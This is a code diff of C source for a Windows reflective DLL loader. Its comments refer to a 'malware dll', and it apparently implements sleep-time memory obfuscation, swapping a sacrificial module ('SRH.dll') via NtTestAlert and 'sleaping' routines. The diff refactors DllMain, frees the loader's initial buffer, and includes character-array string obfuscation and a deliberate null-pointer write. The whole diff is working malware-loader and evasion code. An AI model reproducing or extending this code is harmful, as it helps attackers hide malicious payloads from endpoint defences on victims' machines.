@@ -329,14 +329,17 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 
 	for (int i = 0; i < img_file_hdr.NumberOfSections; i++)
 	{
-		custom_memcpy(
+		custom_memcpy_classic(
 			(PVOID)(reflective_dll_base + pe_section_ptr_array[i]->VirtualAddress),
 			(PVOID)(current_module_base + pe_section_ptr_array[i]->PointerToRawData),
-			pe_section_ptr_array[i]->SizeOfRawData,
-			(PBYTE)(resolve_jmp_to_actual_function(ReflectiveFunction)),
-			dll_hdr->funcSize
+			pe_section_ptr_array[i]->SizeOfRawData
 		);
 	}
+
+	//custom_memzero(
+	//	(PBYTE)(resolve_jmp_to_actual_function(ReflectiveFunction)),
+	//	dll_hdr->funcSize
+	//);
 
     
     char str_msvcp140d[] = { 'm', 's', 'v', 'c', 'p', '1', '4', '0', 'd', '.', 'd', 'l', 'l', '\0' };
@@ -631,10 +634,6 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 
 	dll_main = (fnDllMain)(pebase + img_opt_hdr->AddressOfEntryPoint);
 
-	void** buggy = NULL;
-	*buggy = (void*)img_opt_hdr->AddressOfEntryPoint;
-
-
 	HANDLE h_thread = func_CreateThread(
 		NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc,
 		(LPVOID)dll_main, 0, NULL
@@ -721,76 +720,88 @@ bool init_nt_func_s(PNT_FUNCTIONS nt_func_s)
 
 }
 
+static BOOL custom_process_attach(HMODULE hModule)
+{
+	void** buggy = 0;
+	*buggy = (void*)hModule;
+
+	PSAC_DLL_HEADER sac_dll_header = NULL;
+
+	// even if unmapped it's in the PEB
+	PBYTE sac_dll_base = (PBYTE)GetModuleHandleA("SRH.dll");
+	if (sac_dll_base == NULL)
+		return FALSE;
+
+	sac_dll_header = (PSAC_DLL_HEADER)sac_dll_base;
+
+	// retrieve the information left from the reflective loader
+	HANDLE sac_dll_handle = sac_dll_header->sac_dll_handle;
+	// retrieve handle of malware dll
+	HANDLE mal_dll_handle = sac_dll_header->mal_dll_handle;
+	SIZE_T sac_dll_size = sac_dll_header->payload_size;
+
+	PBYTE old_memory = (PBYTE)sac_dll_header->to_free;
+
+	sac_dll_base = (PBYTE)(sac_dll_header + 1);
+
+	// remove the very first buffer allocated for the reflective dll
+	if (VirtualFree(old_memory, 0, MEM_RELEASE) == 0)
+	{
+		// error releasing old buffer
+		return FALSE;
+	}
+
+	// initialize all the NtFunctions
+	NT_FUNCTIONS nt_func_s = { 0 };
+	if (!init_nt_func_s(&nt_func_s))
+	{
+		return FALSE;
+	}
+
+	HMODULE hm_ntdll = { 0 };
+	if (!(hm_ntdll = GetModuleHandleA("ntdll.dll")))
+		return FALSE;
+
+	PVOID NtTestAlert_addr = GetProcAddress(hm_ntdll, "NtTestAlert");
+	if (NtTestAlert_addr == NULL)
+		return FALSE;
+
+	do
+	{
+		MessageBoxA(NULL, "Sleaping", "Swappala", MB_OK | MB_ICONINFORMATION);
+		if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_func_s, NtTestAlert_addr) == -1)
+		{
+			MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
+			return FALSE;
+		}
+
+	} while (true);
+
+	return TRUE;
+}
 
 BOOL APIENTRY DllMain(HMODULE hModule,
 	DWORD  ul_reason_for_call,
 	LPVOID lpReserved
 )
 {
-	switch (ul_reason_for_call)
+
+	if (ul_reason_for_call == 1)
 	{
-	case DLL_PROCESS_ATTACH:
-	{
-		PSAC_DLL_HEADER sac_dll_header = NULL;
-
-		// even if unmapped it's in the PEB
-		PBYTE sac_dll_base = (PBYTE)GetModuleHandleA("SRH.dll");
-		if (sac_dll_base == NULL)
-			return FALSE;
-
-		sac_dll_header = (PSAC_DLL_HEADER)sac_dll_base;
-
-		// retrieve the information left from the reflective loader
-		HANDLE sac_dll_handle = sac_dll_header->sac_dll_handle;
-		// retrieve handle of malware dll
-		HANDLE mal_dll_handle = sac_dll_header->mal_dll_handle;
-		SIZE_T sac_dll_size = sac_dll_header->payload_size;
-
-		PBYTE old_memory = (PBYTE)sac_dll_header->to_free;
-
-		sac_dll_base = (PBYTE)(sac_dll_header + 1);
-
-		// remove the very first buffer allocated for the reflective dll
-		if (VirtualFree(old_memory, 0, MEM_RELEASE) == 0)
-		{
-			// error releasing old buffer
-			return FALSE;
-		}
-
-		// initialize all the NtFunctions
-		NT_FUNCTIONS nt_func_s = { 0 };
-		if (!init_nt_func_s(&nt_func_s))
-		{
-			return FALSE;
-		}
-
-		HMODULE hm_ntdll = { 0 };
-		if (!(hm_ntdll = GetModuleHandleA("ntdll.dll")))
-			return FALSE;
-
-		PVOID NtTestAlert_addr = GetProcAddress(hm_ntdll, "NtTestAlert");
-		if (NtTestAlert_addr == NULL)
-			return FALSE;
-
-		do
-		{
-			MessageBoxA(NULL, "Sleaping", "Swappala", MB_OK | MB_ICONINFORMATION);
-			if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_func_s, NtTestAlert_addr) == -1)
-			{
-				MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
-				return FALSE;
-			}
-
-		} while (true);
-
-		return TRUE;
+		return custom_process_attach(hModule);
 	}
 
-	case DLL_THREAD_ATTACH:
-	case DLL_THREAD_DETACH:
-	case DLL_PROCESS_DETACH:
-		break;
-	}
 	return TRUE;
+
+	//switch (ul_reason_for_call)
+	//{
+	//case DLL_PROCESS_ATTACH:
+	//	return custom_process_attach(hModule);
+	//case DLL_THREAD_ATTACH:
+	//case DLL_THREAD_DETACH:
+	//case DLL_PROCESS_DETACH:
+	//	break;
+	//}
+	//return TRUE;
 }
 
